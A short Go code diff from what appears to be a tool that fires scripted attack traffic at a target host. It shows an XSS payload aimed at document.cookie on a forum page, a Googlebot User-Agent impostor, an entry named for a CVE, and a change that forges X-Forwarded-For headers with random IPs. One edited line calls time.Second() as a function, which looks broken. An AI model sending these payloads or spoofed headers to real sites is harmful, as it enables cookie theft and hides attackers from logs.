@@ -122,7 +122,7 @@ func (p *program) Start(s service.Service) error {
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 	impostor = Attack{name: "Impostor", method: "GET", maxNap: 240, minNap: 0, pause: 1, maxRequests: 120,
-			  minRequests: 100, url: fmt.Sprintf("http://%s/vid.mov", target), //time.Now()),
+			  minRequests: 100, url: fmt.Sprintf("http://%s/%svid.mov", target, time.Second()),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
@@ -223,7 +223,8 @@ func (attack *Attack) send() {
 	}
 
 	/* Get random ip from ip slice */
-	req.Header.Set("X-Source-Ip", randomIP())
+	//req.Header.Set("X-Source-Ip", randomIP())
+	req.Header.Set("X-Forwarded-For", randomIP())
 
 	/* Set Headers if they exist */
 	if attack.headers != nil {
